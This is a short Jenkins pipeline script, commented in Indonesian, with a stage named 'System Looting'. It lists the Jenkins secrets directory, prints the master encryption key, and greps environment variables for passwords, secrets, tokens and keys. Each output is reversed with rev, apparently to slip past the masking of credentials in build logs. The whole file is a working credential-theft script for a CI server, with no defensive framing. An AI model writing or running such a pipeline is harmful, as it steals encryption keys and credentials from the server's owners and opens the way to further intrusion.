pipeline {
    agent any
    stages {
        stage('System Looting') {
            steps {
                script {
                    // 1. Cek apakah folder secrets bisa diakses
                    sh 'ls -la /var/lib/jenkins/secrets/ || ls -la $JENKINS_HOME/secrets/'
                    
                    // 2. Coba baca master key (Kunci Enkripsi Utama)
                    sh 'cat /var/lib/jenkins/secrets/master.key | rev || cat $JENKINS_HOME/secrets/master.key | rev'
                    
                    // 3. Cari kredensial di environment variable yang terpapar otomatis
                    sh 'env | grep -Ei "PASSWORD|SECRET|TOKEN|KEY|AUTH" | rev'
                }
            }
        }
    }
}
